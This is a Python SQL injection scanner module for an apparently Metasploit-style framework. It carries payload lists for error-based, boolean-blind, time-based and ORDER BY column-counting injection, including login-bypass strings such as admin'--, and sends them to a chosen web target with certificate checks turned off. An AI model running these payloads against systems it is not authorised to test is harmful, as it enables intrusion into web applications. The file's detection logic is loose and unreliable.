#!/usr/bin/env python3
"""
SQL Injection Scanner Auxiliary Module - ENHANCED VERSION
"""

import time
import requests
import json
import urllib.parse
import random
from typing import Dict, List, Optional
from auxiliary.auxiliary_base import AuxiliaryBase

class SQLInjectionScanner(AuxiliaryBase):
    def __init__(self):
        super().__init__()
        self.name = "auxiliary/scanner/web/sql_injection"
        self.description = "Comprehensive SQL Injection Vulnerability Scanner"
        self.author = "PySploit Framework"
        self.references = [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://portswigger.net/web-security/sql-injection"
        ]
        self.targets = ["Web applications", "APIs", "Web services"]
        
        self.options = {
            'RHOSTS': {'type': 'string', 'required': True, 'description': 'Target URL (http://example.com)'},
            'TARGETURI': {'type': 'string', 'required': False, 'default': '/', 'description': 'Target URI path'},
            'METHOD': {'type': 'string', 'required': False, 'default': 'AUTO', 'description': 'HTTP method (GET|POST|AUTO)'},
            'PARAMETERS': {'type': 'string', 'required': False, 'default': 'id,page,user,category,search', 'description': 'GET parameters to test (comma-separated)'},
            'DATA': {'type': 'string', 'required': False, 'default': 'username,password,email,query,search', 'description': 'POST data parameters to test'},
            'COOKIES': {'type': 'string', 'required': False, 'description': 'Cookies for authenticated scanning'},
            'USER_AGENT': {'type': 'string', 'required': False, 'default': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'description': 'User-Agent header'},
            'TIMEOUT': {'type': 'int', 'required': False, 'default': 5, 'description': 'Request timeout in seconds'},
            'VERBOSE': {'type': 'bool', 'required': False, 'default': True, 'description': 'Show detailed output'},
            'AGGRESSIVE': {'type': 'bool', 'required': False, 'default': False, 'description': 'Use more aggressive payloads'}
        }
        
        self.vulnerabilities = []
        self.session = None
        self.baseline_response = None

    def get_option(self, name):
        """Safely get option value with proper type conversion"""
        if name in self.options and 'value' in self.options[name]:
            value = self.options[name]['value']
        elif 'default' in self.options[name]:
            value = self.options[name]['default']
        else:
            return None
        
        # Type conversion
        option_type = self.options[name].get('type', 'string')
        
        if option_type == 'int':
            try:
                return int(value)
            except (ValueError, TypeError):
                print(f"[!] Warning: Option {name} should be integer, using default")
                return self.options[name].get('default')
        elif option_type == 'bool':
            if isinstance(value, str):
                return value.lower() in ('true', 'yes', '1', 'on')
            return bool(value)
        else:
            return str(value)

    def initialize_session(self):
        """Initialize HTTP session with headers and cookies"""
        self.session = requests.Session()
        
        # Set User-Agent
        user_agent = self.get_option('USER_AGENT')
        if user_agent:
            self.session.headers.update({'User-Agent': user_agent})
        
        # Set cookies if provided
        cookies_str = self.get_option('COOKIES')
        if cookies_str:
            try:
                cookies = {}
                for cookie in cookies_str.split(';'):
                    if '=' in cookie:
                        key, value = cookie.strip().split('=', 1)
                        cookies[key] = value
                self.session.cookies.update(cookies)
            except Exception as e:
                print(f"[!] Warning: Failed to parse cookies: {e}")
        
        # Disable SSL verification for testing
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()

    def get_baseline(self, url, method, parameters):
        """Get baseline response for comparison"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=parameters, timeout=self.get_option('TIMEOUT'), verify=False)
            else:
                response = self.session.post(url, data=parameters, timeout=self.get_option('TIMEOUT'), verify=False)
            
            return response
        except Exception as e:
            if self.get_option('VERBOSE'):
                print(f"[-] Baseline request failed: {e}")
            return None

    def test_basic_injection(self, url, method, parameters):
        """Test basic SQL injection patterns"""
        vulnerabilities = []
        
        # Basic payloads that are less likely to cause 400 errors
        basic_payloads = [
            "'",
            "''",
            "`",
            "\\",
            "\"",
            "' OR '1'='1",
            "' OR 1=1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "1 OR 1=1",
            "1' OR '1'='1",
            "admin'--",
            "test' OR '1'='1'--",
            "administrator'--"
        ]
        
        for payload in basic_payloads:
            try:
                response = self._send_safe_request(url, method, parameters, payload)
                if not response:
                    continue
                    
                # Check for SQL errors
                if response.status_code == 200 and self._detect_sql_errors(response.text):
                    vulnerabilities.append({
                        'type': "Basic SQL injection",
                        'url': url,
                        'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                        'payload': payload,
                        'evidence': "SQL error in response",
                        'risk_level': 'High',
                        'confidence': 'High',
                        'response_code': response.status_code
                    })
                    continue
                
                # Check for different response than baseline
                if (self.baseline_response and 
                    response.status_code == 200 and 
                    self.baseline_response.status_code == 200 and
                    self._is_response_different(response.text, self.baseline_response.text)):
                    vulnerabilities.append({
                        'type': "Basic SQL injection",
                        'url': url,
                        'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                        'payload': payload,
                        'evidence': "Different response content",
                        'risk_level': 'Medium',
                        'confidence': 'Medium',
                        'response_code': response.status_code
                    })
                    
            except Exception as e:
                if self.get_option('VERBOSE'):
                    print(f"[-] Basic injection test failed: {e}")
                continue
                
        return vulnerabilities

    def test_union_attacks(self, url, method, parameters):
        """Test UNION-based SQL injection"""
        vulnerabilities = []
        
        # Test number of columns
        for i in range(1, 10):
            payloads = [
                f"' ORDER BY {i}--",
                f"' ORDER BY {i}#",
                f" ORDER BY {i}--"
            ]
            
            for payload in payloads:
                try:
                    response = self._send_safe_request(url, method, parameters, payload)
                    if not response:
                        continue
                        
                    if response.status_code == 200 and not self._detect_sql_errors(response.text):
                        vulnerabilities.append({
                            'type': "UNION attack - column counting",
                            'url': url,
                            'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                            'payload': payload,
                            'evidence': f"Successful ORDER BY with {i} columns",
                            'risk_level': 'High',
                            'confidence': 'Medium',
                            'response_code': response.status_code
                        })
                        break
                        
                except Exception as e:
                    continue
        
        return vulnerabilities

    def test_boolean_blind(self, url, method, parameters):
        """Test boolean-based blind SQL injection"""
        vulnerabilities = []
        
        true_payloads = [
            "' AND '1'='1",
            "' AND 1=1",
            " AND 1=1",
            "' OR 1=1--",
            "administrator'--"
        ]
        
        false_payloads = [
            "' AND '1'='2", 
            "' AND 1=2",
            " AND 1=2",
            "' OR 1=2--",
            "administrator'--"
        ]
        
        for true_payload, false_payload in zip(true_payloads, false_payloads):
            try:
                true_response = self._send_safe_request(url, method, parameters, true_payload)
                false_response = self._send_safe_request(url, method, parameters, false_payload)
                
                if not true_response or not false_response:
                    continue
                    
                if (true_response.status_code == 200 and false_response.status_code == 200 and
                    self._is_response_different(true_response.text, false_response.text)):
                    vulnerabilities.append({
                        'type': "Boolean-based blind SQL injection",
                        'url': url,
                        'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                        'payload': f"TRUE: {true_payload}, FALSE: {false_payload}",
                        'evidence': "Different responses for true/false conditions",
                        'risk_level': 'Medium',
                        'confidence': 'Medium',
                        'response_code': 200
                    })
                    break
                    
            except Exception as e:
                continue
                
        return vulnerabilities

    def test_time_based(self, url, method, parameters):
        """Test time-based blind SQL injection"""
        vulnerabilities = []
        
        time_payloads = [
            ("' AND SLEEP(2)--", "MySQL"),
            ("' AND pg_sleep(2)--", "PostgreSQL"),
            ("' AND WAITFOR DELAY '00:00:02'--", "MSSQL"),
            ("'; WAITFOR DELAY '00:00:02'--", "MSSQL")
        ]
        
        for payload, db_type in time_payloads:
            try:
                start_time = time.time()
                response = self._send_safe_request(url, method, parameters, payload)
                end_time = time.time()
                
                if not response:
                    continue
                    
                response_time = end_time - start_time
                if response_time >= 1.5:
                    vulnerabilities.append({
                        'type': f"Time-based blind SQL injection ({db_type})",
                        'url': url,
                        'parameter': list(parameters.keys())[0] if parameters else 'unknown',
                        'payload': payload,
                        'evidence': f"Response delayed by {response_time:.2f} seconds",
                        'risk_level': 'Medium',
                        'confidence': 'Medium',
                        'response_code': response.status_code if response else 0
                    })
                    break
                    
            except Exception as e:
                continue
                
        return vulnerabilities

    def _send_safe_request(self, url, method, original_parameters, payload):
        """Send request with better error handling and payload encoding"""
        try:
            # Create safe parameters - only modify one parameter
            test_parameters = {}
            if original_parameters:
                param_names = list(original_parameters.keys())
                if param_names:
                    first_param = param_names[0]
                    
                    # Try different encoding strategies
                    encoded_payloads = [
                        payload,  # Raw
                        urllib.parse.quote(payload),  # URL encoded
                        urllib.parse.quote_plus(payload),  # URL+ encoded
                    ]
                    
                    for encoded_payload in encoded_payloads:
                        test_parameters = original_parameters.copy()
                        test_parameters[first_param] = encoded_payload
                        
                        timeout = self.get_option('TIMEOUT')
                        
                        if self.get_option('VERBOSE'):
                            print(f"[*] Testing: {first_param}={encoded_payload[:50]}...")
                        
                        if method.upper() == 'GET':
                            response = self.session.get(url, params=test_parameters, timeout=timeout, verify=False)
                        else:
                            response = self.session.post(url, data=test_parameters, timeout=timeout, verify=False)
                        
                        if response.status_code != 400:  # Skip bad requests
                            if self.get_option('VERBOSE'):
                                print(f"[*] Response: {response.status_code}")
                            return response
                        else:
                            if self.get_option('VERBOSE'):
                                print(f"[-] Got 400, trying next encoding...")
            
            return None
                
        except requests.exceptions.Timeout:
            if self.get_option('VERBOSE'):
                print(f"[-] Timeout for payload")
            return None
        except requests.exceptions.ConnectionError:
            if self.get_option('VERBOSE'):
                print(f"[-] Connection error")
            return None
        except Exception as e:
            if self.get_option('VERBOSE'):
                print(f"[-] Request failed: {e}")
            return None

    def _detect_sql_errors(self, response_text):
        """Detect SQL errors in response"""
        sql_errors = [
            "sql", "mysql", "ora-", "postgresql", "microsoft ole db",
            "odbc driver", "sqlserver", "unclosed quotation mark", "warning: mysql",
            "you have an error in your sql syntax", "supplied argument is not a valid mysql",
            "incorrect syntax near", "syntax error has occurred", "sqlstate", 
            "pl/sql", "database error", "query failed"
        ]
        text_lower = response_text.lower()
        return any(error in text_lower for error in sql_errors)

    def _is_response_different(self, response1, response2, threshold=0.3):
        """Check if two responses are significantly different"""
        if response1 == response2:
            return False
        
        # Simple length-based difference check
        len1, len2 = len(response1), len(response2)
        if len1 == 0 or len2 == 0:
            return True
            
        length_diff = abs(len1 - len2) / max(len1, len2)
        return length_diff > threshold

    def discover_parameters(self, url):
        """Try to discover what parameters the endpoint expects"""
        print("[*] Discovering parameters...")
        
        test_combinations = [
            # Common parameter names with different values
            {'id': '1', 'page': '1', 'category': 'test'},
            {'search': 'test', 'q': 'test', 'query': 'test'},
            {'user': 'test', 'username': 'test', 'name': 'test'},
            {'product': '1', 'item': '1', 'article': '1'}
        ]
        
        for params in test_combinations:
            try:
                response = self.session.get(url, params=params, timeout=3, verify=False)
                if response.status_code == 200:
                    print(f"[+] Parameters might work: {list(params.keys())}")
                    return list(params.keys())
            except:
                continue
        
        return ['id']  # Fallback to common parameter

    def scan_endpoint(self, url, method, parameters_list):
        """Scan a single endpoint with multiple parameters"""
        vulnerabilities = []
        
        for param_name in parameters_list:
            if self.get_option('VERBOSE'):
                print(f"\n[*] Testing parameter: {param_name}")
            
            parameters = {param_name: '1'}  # Start with safe value
            
            # Get baseline
            self.baseline_response = self.get_baseline(url, method, parameters)
            if not self.baseline_response:
                if self.get_option('VERBOSE'):
                    print(f"[-] Could not get baseline for {param_name}")
                continue
                
            if self.get_option('VERBOSE'):
                print(f"[*] Baseline status: {self.baseline_response.status_code}")
            
            # Test different injection types
            test_functions = [
                self.test_basic_injection,
                self.test_boolean_blind,
                self.test_union_attacks,
                self.test_time_based
            ]
            
            for test_func in test_functions:
                try:
                    vulns = test_func(url, method, parameters)
                    vulnerabilities.extend(vulns)
                    if vulns and self.get_option('VERBOSE'):
                        print(f"[+] Found {len(vulns)} with {test_func.__name__}")
                except Exception as e:
                    if self.get_option('VERBOSE'):
                        print(f"[-] Test {test_func.__name__} failed: {e}")
        
        return vulnerabilities

    def run(self):
        """Main scan method"""
        print("[*] Starting Enhanced SQL Injection Scanner...")
        
        # Get options
        rhosts = self.get_option('RHOSTS')
        target_uri = self.get_option('TARGETURI')
        method = self.get_option('METHOD')
        parameters_str = self.get_option('PARAMETERS')
        data_str = self.get_option('DATA')
        verbose = self.get_option('VERBOSE')
        
        if not rhosts:
            print("[-] RHOSTS is required")
            return False
        
        # Initialize HTTP session
        self.initialize_session()
        
        # Build target URL
        target_url = rhosts.rstrip('/') + '/' + target_uri.lstrip('/')
        
        # Parse parameters
        get_parameters = [p.strip() for p in parameters_str.split(',')] if parameters_str else []
        post_parameters = [p.strip() for p in data_str.split(',')] if data_str else []
        
        print(f"[*] Target: {target_url}")
        print(f"[*] Method: {method}")
        print(f"[*] GET Parameters: {', '.join(get_parameters)}")
        print(f"[*] POST Parameters: {', '.join(post_parameters)}")
        print("[*] Scanning...\n")
        
        start_time = time.time()
        self.vulnerabilities = []
        
        try:
            # Auto-detect method if needed
            if method.upper() == 'AUTO':
                # Try GET first
                test_response = self.session.get(target_url, timeout=5, verify=False)
                if test_response.status_code == 200:
                    method = 'GET'
                    print("[*] Auto-detected: Using GET method")
                else:
                    method = 'POST'
                    print("[*] Auto-detected: Using POST method")
            
            # Discover parameters if none provided
            if not get_parameters and method.upper() == 'GET':
                get_parameters = self.discover_parameters(target_url)
            
            # Scan based on method
            if method.upper() == 'GET' and get_parameters:
                print(f"[*] Testing GET with parameters: {get_parameters}")
                get_vulns = self.scan_endpoint(target_url, 'GET', get_parameters)
                self.vulnerabilities.extend(get_vulns)
            
            elif method.upper() == 'POST' and post_parameters:
                print(f"[*] Testing POST with parameters: {post_parameters}")
                post_vulns = self.scan_endpoint(target_url, 'POST', post_parameters)
                self.vulnerabilities.extend(post_vulns)
            
            # Show results
            scan_time = time.time() - start_time
            self.show_results(scan_time)
            
            return True
            
        except Exception as e:
            print(f"[-] Scan error: {e}")
            if verbose:
                import traceback
                traceback.print_exc()
            return False

    def show_results(self, scan_time):
        """Display scan results"""
        print(f"\n[*] Scan completed in {scan_time:.2f} seconds")
        print(f"[*] Found {len(self.vulnerabilities)} vulnerabilities\n")
        
        if self.vulnerabilities:
            print("VULNERABILITIES FOUND:")
            print("=" * 80)
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. {vuln['type']}")
                print(f"   URL: {vuln['url']}")
                print(f"   Parameter: {vuln['parameter']}")
                print(f"   Payload: {vuln['payload']}")
                print(f"   Evidence: {vuln['evidence']}")
                print(f"   Risk: {vuln['risk_level']}, Confidence: {vuln['confidence']}")
                print(f"   Response Code: {vuln.get('response_code', 'N/A')}")
        
        else:
            print("[+] No SQL injection vulnerabilities found")
        
        # Generate report file
        self.generate_report()

    def generate_report(self):
        """Generate comprehensive vulnerability report"""
        report = {
            "scan_info": {
                "target": self.get_option('RHOSTS'),
                "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "module": self.name,
                "vulnerabilities_found": len(self.vulnerabilities)
            },
            "vulnerabilities": self.vulnerabilities,
            "summary": {
                "high_risk": len([v for v in self.vulnerabilities if v['risk_level'] == 'High']),
                "medium_risk": len([v for v in self.vulnerabilities if v['risk_level'] == 'Medium']),
                "low_risk": len([v for v in self.vulnerabilities if v['risk_level'] == 'Low'])
            }
        }
        
        # Save report to file
        filename = f"sql_injection_scan_{int(time.time())}.json"
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"[+] Detailed report saved to: {filename}")
        except Exception as e:
            print(f"[-] Failed to save report: {e}")
        
        return report